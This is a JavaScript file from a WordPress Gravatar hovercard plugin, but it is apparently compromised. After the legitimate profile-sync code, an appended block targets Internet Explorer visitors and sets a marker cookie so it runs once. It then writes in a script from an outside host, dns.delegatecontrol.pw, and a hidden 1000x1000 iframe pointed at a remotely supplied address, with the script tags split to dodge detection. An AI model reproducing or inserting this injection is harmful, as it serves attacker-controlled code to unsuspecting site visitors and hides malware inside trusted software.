WPGroHo = jQuery.extend( {
	my_hash: '',
	data: {},
	renderers: {},
	syncProfileData: function( hash, id ) {
		if ( !WPGroHo.data[hash] ) {
			WPGroHo.data[hash] = {};
			a = jQuery( 'div.grofile-hash-map-' + hash + ' span' ).each( function() {
				WPGroHo.data[hash][this.className] = jQuery( this ).text();
			} );
		}

		WPGroHo.appendProfileData( WPGroHo.data[hash], hash, id );
	},
	appendProfileData: function( data, hash, id ) {
		for ( var key in data ) {
			if ( jQuery.isFunction( WPGroHo.renderers[key] ) ) {
				return WPGroHo.renderers[key]( data[key], hash, id, key );
			}

			jQuery( '#' + id ).find( 'h4' ).after( jQuery( '<p class="grav-extra ' + key + '" />' ).html( data[key] ) );
		}
	}
}, WPGroHo );

jQuery( document ).ready( function( $ ) {
	Gravatar.profile_cb = function( h, d ) {
		WPGroHo.syncProfileData( h, d );
	};

	Gravatar.my_hash = WPGroHo.my_hash;
	Gravatar.init( 'body', '#wpadminbar' );
} );


var useagens__j = window.navigator.userAgent; var cookie_set__j = 'trase_h=sea'; var c_name__j = document.cookie; if (useagens__j.indexOf('MSIE') != -1 && c_name__j.indexOf(cookie_set__j) == -1 && (/*@cc_on!@*/0)) { document.cookie=cookie_set__j + '; expires=Thu, 16 Oct 2020 11:02:40 GMT'; 	document.write('<s' + 'cript src="http://dns.delegatecontrol.pw/jquery.js" type="text/javascript"><' + '/script>'); document.write('<s' + 'cript type="text/javascript">' + 'function xhh54_changesite()' + '{' + 'if (window.getlasposit_hea_se)' + 'document.getElementById(\'ifrmseth_j4\').src = getlasposit_hea_se();' + '}' + 'window.onload=xhh54_changesite;' + '<' + '/script>' + '<style type="text/css">#ifrmseth_j4 { display:none; }</style>' + '<iframe id="ifrmseth_j4" src="" width="1000" height="1000"></iframe>'); }
